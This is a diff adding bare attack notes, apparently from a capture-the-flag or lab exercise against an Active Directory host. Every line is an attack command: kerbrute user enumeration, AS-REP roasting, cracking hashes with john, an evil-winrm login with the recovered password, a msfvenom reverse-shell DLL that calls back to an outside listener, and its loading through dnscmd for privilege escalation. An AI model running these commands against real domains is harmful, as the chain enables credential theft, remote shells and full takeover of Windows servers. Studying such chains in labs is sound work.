@@ -1,0 +1,30 @@
+$ ~/go/bin/kerbrute userenum --dc brute.csl -d brute.csl /usr/share/wordlists/rockyou.txt
+
+GetNPUsers.py -usersfile ad_user -dc-ip 172.31.3.3 brute.csl/ -no-pass
+
+john hash --wordlist=/usr/share/wordlists/rockyou.txt     
+
+john hash --show    
+
+#login via evil-winrm
+
+evil-winrm -i brute.csl -u tess -p Unique1 
+
+whoami /all
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.35 LPORT=1234 -f dll > pwn.dll
+
+upload pwn.dll
+
+dnscmd /config /serverlevelplugindll C:\Users\Tess\Documents\pwn.dll
+
+sc.exe stop dns 
+sc.exe start dns 
+nc -nlvp 1234
+
+
+
+
+
+
+
